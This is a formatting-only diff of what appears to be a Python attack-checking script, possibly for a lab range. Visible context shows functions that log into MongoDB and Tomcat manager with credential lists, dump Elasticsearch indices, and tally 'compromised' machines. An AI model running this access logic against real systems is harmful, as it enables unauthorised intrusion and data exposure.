@@ -238,7 +238,9 @@ def test_mongodb(target):
                 if user:
                     uri = f"mongodb://{user}:{pwd}@{target['ip']}:{target['port']}/?authSource=admin&serverSelectionTimeoutMS=5000"
                 else:
-                    uri = f"mongodb://{target['ip']}:{target['port']}/?serverSelectionTimeoutMS=5000"
+                    uri = (
+                        f"mongodb://{target['ip']}:{target['port']}/?serverSelectionTimeoutMS=5000"
+                    )
                 c = MongoClient(uri, serverSelectionTimeoutMS=5000)
                 dbs = c.list_database_names()
                 c.close()
@@ -291,7 +293,9 @@ def test_elasticsearch(target):
     try:
         import urllib.request
 
-        with urllib.request.urlopen(f"http://{target['ip']}:{target['port']}/_cat/indices?v", timeout=5) as resp:
+        with urllib.request.urlopen(
+            f"http://{target['ip']}:{target['port']}/_cat/indices?v", timeout=5
+        ) as resp:
             body = resp.read().decode()
         return True, f"indices dumped ({len(body)} bytes)"
     except Exception as e:
@@ -411,6 +415,7 @@ def test_tomcat(target):
         for user, pwd in target.get("creds", []):
             try:
                 import base64
+
                 token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                 req = urllib.request.Request(
                     f"http://{target['ip']}:{target['port']}/manager/html",
@@ -498,9 +503,13 @@ def main():
     if pwned == total:
         console.print("\n[bold green]🎉 ALL MACHINES COMPROMISED! 🎉[/bold green]")
     elif pwned >= reachable * 0.8:
-        console.print(f"\n[bold green]✅ {pwned}/{reachable} reachable machines compromised[/bold green]")
+        console.print(
+            f"\n[bold green]✅ {pwned}/{reachable} reachable machines compromised[/bold green]"
+        )
     else:
-        console.print(f"\n[yellow]⚠️ Only {pwned}/{reachable} reachable machines compromised[/yellow]")
+        console.print(
+            f"\n[yellow]⚠️ Only {pwned}/{reachable} reachable machines compromised[/yellow]"
+        )
 
     return pwned == total
 
